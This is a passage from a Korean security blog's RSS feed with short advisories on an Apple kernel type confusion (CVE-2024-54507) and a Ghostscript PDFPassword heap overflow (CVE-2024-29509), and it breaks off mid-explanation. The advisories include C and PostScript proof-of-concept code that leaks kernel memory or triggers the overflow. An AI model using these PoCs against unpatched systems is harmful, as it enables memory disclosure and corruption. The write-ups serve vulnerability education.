&#xB098;&#xC624;&#xB294; &#xD0C0;&#xAC9F;&#xC740; &#xB530;&#xB85C; &#xC788;&#xB2E4;. &#xD574;&#xCEE4;&#xB4E4;&#xC774; &#xB9CE;&#xC774; &#xAC70;&#xCCD0;&#xAC04; &#xD0C0;&#xAC9F;&#xC740; &#xBCF4;&#xC548; &#xC218;&#xC900;&#xC774; &#xB9E4;&#xC6B0; &#xB192;&#xB2E4;.</li><li>IP CAM&#xC5D0;&#xC11C; &#xB108;&#xBB34; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC5B4;&#xB290;&#xC815;&#xB3C4; &#xD328;&#xCE58;&#xAC00; &#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xBCF4;&#xC778;&#xB2E4;.</li><li>IoT &#xAE30;&#xAE30; &#xBD84;&#xC11D;&#xC774; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xAE30;&#xCD08; &#xC9C0;&#xC2DD;&#xC744; &#xB9CE;&#xC774; &#xC694;&#xAD6C;&#xD55C;&#xB2E4;. Windows EXE &#xC815;&#xC801; &#xBD84;&#xC11D;, &#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xD3EC;&#xD568;&#xD574; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBD84;&#xC11D;, &#xC18C;&#xCF13; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D;, &#xC6F9;&#xD574;&#xD0B9;, &#xC2DC;&#xC2A4;&#xD15C; &#xD574;&#xD0B9;, &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xC801; &#xC811;&#xADFC; &#xB4F1; &#xC54C;&#xC544;&#xC57C; &#xD560; &#xAC8C; &#xB9CE;&#xB2E4;.</li><li>&#xD38C;&#xC6E8;&#xC5B4; &#xCD94;&#xCD9C;&#xACFC; &#xB3D9;&#xC801; &#xB514;&#xBC84;&#xAE45; &#xD658;&#xACBD; &#xAD6C;&#xCD95;&#xC774; &#xAC00;&#xC7A5; &#xC6B0;&#xC120;&#xC2DC; &#xB418;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;.</li></ul><p><img src="image%2014.png" alt="image.png"></p><p>&#xAE34; &#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/hunjison/">hunjison</category>
      
      <category domain="https://hackyboiz.github.io/tags/Bug-Bounty/">Bug Bounty</category>
      
      <category domain="https://hackyboiz.github.io/tags/IP-CAMERA/">IP CAMERA</category>
      
      <category domain="https://hackyboiz.github.io/tags/IoT/">IoT</category>
      
      
      <comments>https://hackyboiz.github.io/2025/02/16/hunjison/IPCAM/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-54507: Apple macOS 및 iOS의 Type Confusion</title>
      <link>https://hackyboiz.github.io/2025/02/15/romi0x/1day1line0215/</link>
      <guid>https://hackyboiz.github.io/2025/02/15/romi0x/1day1line0215/</guid>
      <pubDate>Sat, 15 Feb 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://jprx.io/cve-2024-54507/&quot;&gt;https://jprx.io/cve-2024</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://jprx.io/cve-2024-54507/">https://jprx.io/cve-2024-54507/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>macOS Sequoia 15.2</li><li>iOS 18.2</li><li>iPadOS 18.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2024-54507&#xC740; Apple macOS &#xBC0F; iOS &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Type Confusion  &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; BSD sysctl &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xD1B5;&#xD55C; &#xC798;&#xBABB;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xC77C;&#xBD80; &#xB0B4;&#xC6A9;&#xC744; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>sysctl_udp_log_port</code> &#xD578;&#xB4E4;&#xB7EC; &#xD568;&#xC218;&#xC758; &#xBD80;&#xC801;&#xC808;&#xD55C; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785; &#xCE90;&#xC2A4;&#xD305;&#xC774; &#xC774; &#xBB38;&#xC81C;&#xC758; &#xC6D0;&#xC778;&#xC73C;&#xB85C;, 2&#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC758; <code>uint16_t</code> &#xBCC0;&#xC218;&#xB97C; 4&#xBC14;&#xC774;&#xD2B8; <code>int</code>&#xB85C; &#xC798;&#xBABB; &#xC77D;&#xC5B4;&#xB4E4;&#xC774;&#xBA74;&#xC11C; 2&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; &#xC624;&#xBC84;&#xB9AC;&#xB4DC;(over-read)&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>sysctl_udp_log_port</code> &#xD568;&#xC218;&#xAC00; <code>oid_arg1</code> &#xBCC0;&#xC218;&#xB97C; &#xC798;&#xBABB;&#xB41C; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xC73C;&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD558;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBCC0;&#xC218;&#xB294; &#xC6D0;&#xB798; <code>uint16_t</code> &#xD0C0;&#xC785;&#xC73C;&#xB85C; &#xC815;&#xC758;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB97C; <code>int</code>&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD558;&#xC5EC; 2&#xBC14;&#xC774;&#xD2B8; &#xCD08;&#xACFC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5B4;&#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; <code>sysctl_handle_int</code> &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC2DC;, &#xC0AC;&#xC6A9;&#xC790; &#xACF5;&#xAC04;(user space)&#xC73C;&#xB85C; 2&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB204;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ocaml"><span class="hljs-built_in">int</span> new_value = *(<span class="hljs-built_in">int</span> *)oidp-&gt;oid_arg1;</code></pre><p>&#xC774; &#xCF54;&#xB4DC;&#xB294; <code>oid_arg1</code> &#xD3EC;&#xC778;&#xD130;&#xAC00; <code>uint16_t</code>&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xC74C;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0;, &#xC774;&#xB97C; <code>int</code>&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD558;&#xC5EC; 2&#xBC14;&#xC774;&#xD2B8; &#xCD08;&#xACFC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740;  <code>net.inet.udp.log.remote_port_excluded</code> &#xB77C;&#xB294; sysctl &#xBCC0;&#xC218;&#xB97C; <code>sysctlbyname()</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC77D;&#xC744; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; sysctl &#xD578;&#xB4E4;&#xB7EC; &#xD568;&#xC218;&#xAC00; &#xBC18;&#xD658; &#xD06C;&#xAE30;(<code>len</code>)&#xB97C; &#xC798;&#xBABB; &#xCC98;&#xB9AC;&#xD558;&#xAC70;&#xB098; &#xBA54;&#xBAA8;&#xB9AC; &#xC815;&#xB82C; &#xBB38;&#xC81C;&#xB85C; &#xC778;&#xD574;, &#xD574;&#xB2F9; &#xBCC0;&#xC218; &#xAC12; &#xBC14;&#xB85C; &#xB4A4;&#xC5D0; &#xC788;&#xB294; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; 2&#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xCD94;&#xAC00;&#xB85C; &#xB204;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>PoC &#xCF54;&#xB4DC; &#xC608;&#xC2DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">leak</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">uint64_t</span> val = <span class="hljs-number">0</span>;    <span class="hljs-keyword">size_t</span> len = <span class="hljs-keyword">sizeof</span>(val);    sysctlbyname(<span class="hljs-string">&quot;net.inet.udp.log.remote_port_excluded&quot;</span>, &amp;val, &amp;len, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leaked: 0x%X 0x%X\n&quot;</span>, (val &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0x0FF</span>, (val &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0x0FF</span>);}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB294; <code>net.inet.udp.log.remote_port_excluded</code> &#xBCC0;&#xC218;&#xB97C; &#xC77D;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C;, &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; &#xC815;&#xB82C; &#xBB38;&#xC81C; &#xB610;&#xB294; &#xBC18;&#xD658; &#xD06C;&#xAE30; &#xCC98;&#xB9AC; &#xC624;&#xB958;&#xB85C; &#xC778;&#xD574; &#xD574;&#xB2F9; &#xBCC0;&#xC218; &#xB4A4;&#xC758; 2&#xBC14;&#xC774;&#xD2B8; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB204;&#xCD9C;&#xD558;&#xB294; &#xB370; &#xC131;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-54507">https://nvd.nist.gov/vuln/detail/CVE-2024-54507</a><br><a href="https://support.apple.com/en-us/121837">https://support.apple.com/en-us/121837</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Apple/">Apple</category>
      
      <category domain="https://hackyboiz.github.io/tags/iOS/">iOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/Kernel/">Kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/Type-Confusion/">Type Confusion</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      
      <comments>https://hackyboiz.github.io/2025/02/15/romi0x/1day1line0215/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-29509: Artifex Ghostscript PDFPassword 처리 과정에서 발생하는 Heap Buffer Overflow</title>
      <link>https://hackyboiz.github.io/2025/02/12/clalxk/CVE-2024-29509/</link>
      <guid>https://hackyboiz.github.io/2025/02/12/clalxk/CVE-2024-29509/</guid>
      <pubDate>Wed, 12 Feb 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://codeanlabs.com/blog/research/ghostscript-wrap-up-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://codeanlabs.com/blog/research/ghostscript-wrap-up-overflowing-buffers/">https://codeanlabs.com/blog/research/ghostscript-wrap-up-overflowing-buffers/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ghostscript &lt; 10.03.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Ghostscript&#xB294; PDF &#xD574;&#xC11D; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xBA70;, PDF &#xBB38;&#xC11C;&#xAC00; &#xC554;&#xD638;&#xD654;&#xB41C; &#xACBD;&#xC6B0; &#xC774;&#xB97C; &#xD574;&#xB3C5;&#xD558;&#xAE30; &#xC704;&#xD574; <code>PDFPassword</code> &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788;, PDF &#xD45C;&#xC900;&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xB41C; &#xC5EC;&#xB7EC; &#xC554;&#xD638;&#xD654; &#xBC29;&#xC2DD; &#xC911; &#xD558;&#xB098;&#xC778; <strong>R5(RC4 128&#xBE44;&#xD2B8; &#xC554;&#xD638;&#xD654;)</strong>&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xACBD;&#xC6B0; <code>check_password_R5(...)</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">check_password_R5</span><span class="hljs-params">(pdf_context *ctx, <span class="hljs-keyword">char</span> *Password, <span class="hljs-keyword">int</span> PasswordLen, <span class="hljs-keyword">int</span> KeyLen)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">int</span> code;    <span class="hljs-keyword">if</span> (PasswordLen != <span class="hljs-number">0</span>) {        pdf_string *P = <span class="hljs-literal">NULL</span>, *P_UTF8 = <span class="hljs-literal">NULL</span>;        code = check_user_password_R5(ctx, Password, PasswordLen, KeyLen);        <span class="hljs-keyword">if</span> (code &gt;= <span class="hljs-number">0</span>)            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        code = check_owner_password_R5(ctx, Password, PasswordLen, KeyLen);        <span class="hljs-keyword">if</span> (code &gt;= <span class="hljs-number">0</span>)            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        <span class="hljs-comment">/* If the supplied Password fails as the user *and* owner password, maybe its in</span><span class="hljs-comment">         * the locale, not UTF-8, try converting to UTF-8</span><span class="hljs-comment">         */</span>        code = pdfi_object_alloc(ctx, PDF_STRING, <span class="hljs-built_in">strlen</span>(ctx-&gt;encryption.Password), (pdf_obj **)&amp;P);        <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0</span>)            <span class="hljs-keyword">return</span> code;        <span class="hljs-built_in">memcpy</span>(P-&gt;data, Password, PasswordLen);        pdfi_countup(P);        code = locale_to_utf8(ctx, P, &amp;P_UTF8);        <span class="hljs-keyword">if</span> (code &lt; <span class="hljs-number">0</span>) {            pdfi_countdown(P);            <span class="hljs-keyword">return</span> code;        }        code = check_user_password_R5(ctx, (<span class="hljs-keyword">char</span> *)P_UTF8-&gt;data, P_UTF8-&gt;length, KeyLen);        <span class="hljs-keyword">if</span> (code &gt;= <span class="hljs-number">0</span>) {            pdfi_countdown(P);            pdfi_countdown(P_UTF8);            <span class="hljs-keyword">return</span> code;        }        code = check_owner_password_R5(ctx, (<span class="hljs-keyword">char</span> *)P_UTF8-&gt;data, P_UTF8-&gt;length, KeyLen);        pdfi_countdown(P);        pdfi_countdown(P_UTF8);        <span class="hljs-keyword">if</span> (code &gt;= <span class="hljs-number">0</span>)            <span class="hljs-keyword">return</span> code;    }    code = check_user_password_R5(ctx, (<span class="hljs-keyword">char</span> *)<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>, KeyLen);    <span class="hljs-keyword">if</span> (code &gt;= <span class="hljs-number">0</span>)        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    <span class="hljs-keyword">return</span> check_owner_password_R5(ctx, (<span class="hljs-keyword">char</span> *)<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>, KeyLen);}</code></pre><p>&#xD574;&#xB2F9; <code>check_password_R5(...)</code> &#xD568;&#xC218;&#xB294; &#xC785;&#xB825;&#xB41C; <code>PDFPassword</code>&#xB97C; &#xC0AC;&#xC6A9;&#xC790; &#xBC0F; &#xC18C;&#xC720;&#xC790; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB85C; &#xD655;&#xC778;&#xD55C; &#xD6C4;, &#xC2E4;&#xD328;&#xD560; &#xACBD;&#xC6B0; UTF-8 &#xBCC0;&#xD658;&#xC744; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><strong>&#xBE44;&#xBC00;&#xBC88;&#xD638; &#xAC80;&#xC99D; &#xC2E4;&#xD328; &#xD6C4;, UTF-8 &#xBCC0;&#xD658; &#xC2DC;&#xB3C4;</strong><ul><li>&#xCC98;&#xC74C; &#xC785;&#xB825;&#xB41C; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xAC00; &#xC62C;&#xBC14;&#xB974;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0;, &#xB450; &#xBC88;&#xC9F8; &#xC2DC;&#xB3C4;&#xB97C; &#xC704;&#xD574; UTF-8&#xB85C; &#xBCC0;&#xD658;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xB54C;, <code>locale_to_utf8(...)</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xAE30; &#xC804;&#xC5D0; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xAC00; <strong>&#xC0C8;&#xB85C; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C;&#xC5D0; <code>memcpy(...)</code></strong> &#xB429;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>&#xD560;&#xB2F9; &#xD06C;&#xAE30;(<code>strlen(...)</code>)&#xC640; &#xBCF5;&#xC0AC; &#xD06C;&#xAE30;(<code>PasswordLen</code>) &#xBD88;&#xC77C;&#xCE58; &#xBB38;&#xC81C; &#xBC1C;&#xC0DD;</strong><ul><li><strong>&#xD560;&#xB2F9;&#xB41C; &#xD06C;&#xAE30;</strong>: <code>strlen(ctx-&gt;encryption.Password)</code><ul><li><code>strlen(...)</code>&#xC740; <strong>&#xCCAB; &#xBC88;&#xC9F8; &#xB110; &#xBC14;&#xC774;&#xD2B8;(null-byte)&#xB97C; &#xB9CC;&#xB098;&#xBA74; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xACB0;&#xC815;</strong>&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>&#xBCF5;&#xC0AC;&#xB418;&#xB294; &#xD06C;&#xAE30;</strong>: <code>PasswordLen</code><ul><li><code>PasswordLen</code>&#xC740; <code>PDFPassword</code> PostScript &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xC2E4;&#xC81C; &#xD06C;&#xAE30;&#xC785;&#xB2C8;&#xB2E4;.</li><li>PostScript &#xBB38;&#xC790;&#xC5F4;&#xC740; <strong>&#xB110; &#xBC14;&#xC774;&#xD2B8;(null-byte)&#xB97C; &#xD3EC;&#xD568;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xD06C;&#xAE30;&#xAC00; &#xBCC4;&#xB3C4;&#xB85C; &#xC800;&#xC7A5;</strong>&#xB429;&#xB2C8;&#xB2E4;.</li></ul></li></ul></li><li><strong>&#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xB9CE;&#xC740; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBCF5;&#xC0AC;&#xB418;&#xBA70; &#xD799; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xBC1C;&#xC0DD;</strong><ul><li><strong>PostScript &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xB110; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xACBD;&#xC6B0;</strong>, <code>strlen(...)</code>&#xC774; &#xC2E4;&#xC81C; &#xAE38;&#xC774;&#xB97C; &#xC81C;&#xB300;&#xB85C; &#xACC4;&#xC0B0;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0; <strong>&#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xB97C; &#xC791;&#xAC8C; &#xD560;&#xB2F9;</strong>&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xD6C4; <code>memcpy(...)</code>&#xC5D0;&#xC11C; <code>PasswordLen</code>(&#xC2E4;&#xC81C; &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xD06C;&#xAE30;)&#xB9CC;&#xD07C; &#xBCF5;&#xC0AC;&#xD560; &#xB54C; <strong>&#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xB97C; &#xCD08;&#xACFC;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBCF5;&#xC0AC;&#xB418;&#xBA74;&#xC11C; &#xD799; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;(Heap Buffer Overflow)</strong> &#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ol><p>&#xC800;&#xC7A5;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD1A0;&#xB300;&#xB85C; &#xC124;&#xBA85;&#xD558;&#xC790;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><code>\000</code> &#xC740; PostScript&#xC5D0;&#xC11C; null &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC778;&#xCF54;&#xB529;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs ruby">/PDFPassword (hello\<span class="hljs-number">000</span>world)<span class="hljs-function"><span class="hljs-keyword">def</span></span></code></pre><ol><li>&#xAE38;&#xC774;&#xAC00; 11&#xC778; PostScript &#xBB38;&#xC790;&#xC5F4;&#xC774;&#xC9C0;&#xB9CC; <strong><code>strlen</code></strong>&#xC740; &#xAE38;&#xC774;&#xAC00; 5&#xC778; &#xAC83;&#xC73C;&#xB85C; &#xAC04;&#xC8FC;&#xD569;&#xB2C8;&#xB2E4;. </li><li>&#xC989;, <code>memcpy</code>&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><pre><code class="hljs c"><span class="hljs-comment">//      char[5]    &quot;hello\000world&quot;   11</span><span class="hljs-built_in">memcpy</span>(P-&gt;data,    Password,          PasswordLen);</code></pre><p>&#xC774;&#xC5D0; &#xB530;&#xB77C; PostScript &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>PDFPassword</code>&#xB294; <strong>&#x201C;hello\000world&#x201D;</strong>&#xB85C; &#xC124;&#xC815;&#xB418;&#xBA70;, &#xC774;&#xB294; PostScript &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xAE38;&#xC774;&#xAC00; 11&#xC774;&#xC9C0;&#xB9CC;, <code>strlen(...)</code>&#xC740; &#xCCAB; &#xBC88;&#xC9F8; null-byte&#xB97C; &#xB9CC;&#xB098; 5&#xB97C; &#xBC18;&#xD658;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; 5&#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC758; &#xBC84;&#xD37C;&#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; 11&#xBC14;&#xC774;&#xD2B8; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; <strong>&#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;</strong>&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; poc &#xCF54;&#xB4DC;&#xB85C;,  <strong>PostScript</strong>&#xB85C; &#xC791;&#xC131;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><strong>1. &#xCDE8;&#xC57D;&#xC810; &#xC720;&#xBC1C; PDF &#xD30C;&#xC77C; &#xC0DD;&#xC131;</strong></p><pre><code class="hljs coffeescript">/Payload (%PDF<span class="hljs-number">-1.7</span><span class="hljs-number">1</span> <span class="hljs-number">0</span> obj &lt;&lt; /CF &lt;&lt; /StdCF &lt;&lt; /AuthEvent /DocOpen /CFM /AESV3 /Length <span class="hljs-number">32</span> &gt;&gt; &gt;&gt;/Filter /Standard /Length <span class="hljs-number">256</span>/O &lt;bdc7906c8e8074c880ac23065956c0db6a83d234a942d296364d065edf800b8e32a728ba6916718fbeb70e071a4a33ba&gt;/OE &lt;<span class="hljs-number">7</span>c88773da067c026cc58b5204106d54e320d509ab1d10ac3251f7a14e60d6970&gt;/P <span class="hljs-number">-1028</span> /Perms &lt;<span class="hljs-number">1</span>b6bd44c023964a469d801f598c8d5c4&gt; /R <span class="hljs-number">5</span> /StmF /StdCF /StrF /StdCF/U &lt;<span class="hljs-number">338</span>dc89fb4a90d45cacf91298759e015a6fb0d3f132af0e6970a0079af12054554e7ab059c5392f9abce8a329b2b154b&gt;/UE &lt;<span class="hljs-number">0</span>d8b18de820855c5855de2560a81db57bb4674946bdf2b25eb6b901386492bd7&gt; /V <span class="hljs-number">5</span> &gt;&gt;endobj xref <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0000000000</span> <span class="hljs-number">65535</span> f <span class="hljs-number">0000000009</span> <span class="hljs-number">00000</span> n trailer &lt;&lt; /Encrypt <span class="hljs-number">1</span> <span class="hljs-number">0</span> R &gt;&gt; startxref <span class="hljs-number">0</span>) def</code></pre><ul><li>&#xC704; &#xCF54;&#xB4DC;&#xB294; &#xAC04;&#xB2E8;&#xD55C; <strong>PDF &#xD30C;&#xC77C;&#xC744; PostScript &#xB0B4;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;</strong>&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;.</li><li>PDF&#xC758; <strong>&#xC554;&#xD638;&#xD654; &#xBC84;&#xC804;(R 5)</strong> &#xC744; &#xC9C0;&#xC815;&#xD558;&#xACE0;, AES &#xC554;&#xD638;&#xD654;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBB38;&#xC11C;&#xB97C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC774; &#xD30C;&#xC77C; &#xC790;&#xCCB4;&#xB294; &#xC644;&#xC804;&#xD55C; PDF&#xAC00; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC;, &#xC554;&#xD638; &#xD574;&#xB3C5; &#xB85C;&#xC9C1;&#xC5D0; &#xB3C4;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; 